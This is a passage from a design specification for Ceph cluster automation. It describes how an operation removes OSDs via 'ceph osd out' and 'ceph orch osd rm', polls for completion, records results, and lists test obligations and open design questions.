| `osdIds` | integer[] (each ≥ 0) | yes | | ≥ 1 entry; duplicates removed | OSDs to remove |
| `zap` | boolean, nullish | no | true | | add `--zap` |
| `maxPolls` | positive integer, nullish | no | 60 | | effect poll budget |
| `pollIntervalMs` | positive integer, nullish | no | 15000 | | time between polls |

### Preconditions

Reachable admin host. Judging whether removal is safe for data
(`cephOsdOkToStop`, `cephCapacityReport`) is the caller's job.

### Behaviour

1. Read `ceph osd tree` and collect the `id` of every node whose `type` is
   `osd`. Split the requested ids into present and absent (`skippedAbsent`).
2. If none are present, write a record with `removed=[]` and make no changes.
3. Run `ceph osd out <ids...>` for all present ids in one call, so the data
   drain starts before anything is destroyed.
4. For each present id, run `ceph orch osd rm <id>`, adding `--zap` when `zap`
   is true.
5. Poll `ceph osd tree` until none of the present ids is listed (§1.9). If any
   remain when the budget is spent, throw naming the requested and remaining
   ids.
6. Write the record.

### Idempotency

Ids already gone are reported in `skippedAbsent` and not touched. A re-run
after success is a no-op.

### Output / record

Spec `osdRemoveResult`, key `cephRemoveOsds-<host>-<ids>`, where `<ids>` is
the deduplicated requested ids in ascending order joined by `-` (e.g.
`cephRemoveOsds-192.0.2.10-3-7`). Fields: `requested` (deduplicated,
ascending), `removed`, `skippedAbsent`, `zap`, `capturedAt`.

### Post-verification

Every removed id MUST be absent from `osd tree`.

### Failure modes

- Ids still in the tree after the budget → throw "still present" with the ids.
- A command exits non-zero → throw.

### Security

`osdIds` are integers only; nothing else from the caller reaches a command.

### Why

- Orchestrator removal is asynchronous (drain, destroy, zap) and can take
  seconds on an idle cluster or many minutes on a loaded one. Accepting the
  request is not removal, so the effect is polled.
- Marking OSDs out first starts data movement while the daemons can still
  serve it.

### Test obligations

- [ ] Requested id absent from the tree → `removed=[]`,
      `skippedAbsent=[id]`; no `osd out`, no `orch osd rm`.
- [ ] Happy path → `osd out 3` comes before `orch osd rm 3 --zap`; id gone on
      the second tree read; `removed=[3]`, `skippedAbsent=[]`.
- [ ] `zap: false` → `orch osd rm 3` without `--zap`.
- [ ] Id still present after `maxPolls=2` → rejects "still present";
      `orch osd rm` was issued.
- [ ] `osdIds=[7,3,3]` → key `cephRemoveOsds-<host>-3-7`, `requested=[3,7]`.
- [ ] D47: a non-transport failure of a tree poll stops the loop at once.
- [ ] Schema rejects an empty list, a negative id and a non-integer.

---

## 9. cephCapacityReport

Specified in **05-verify** (D35 governs `atRiskPools`).

## Unresolved

1. **`cephCreateFs` host-list argument name.** D32 replaces the count with an
   explicit host list. This file uses `mdsHosts` and drops `mdsCount`. Align
   the name with `cephApplyMds` in 03-lifecycle.
2. **Grammar ownership.** The identifier and caps grammars are defined in §1.6.
   If 01-transport also defines the identifier grammar, one definition should
   own it and the other should reference it.
3. **Reserved entity names.** `cephCreateCsiUser` would rewrite the caps of
   `client.admin` or `client.bootstrap-*` if asked, which could lock an
   operator out. Recommend refusing `admin` and any name starting
   `bootstrap-`.
4. **Pool-delete gate prior value.** `cephDeleteFs` always sets the gate back
   to false, even if it was true before the run. Recommend keeping that as the
   safe default; confirm.
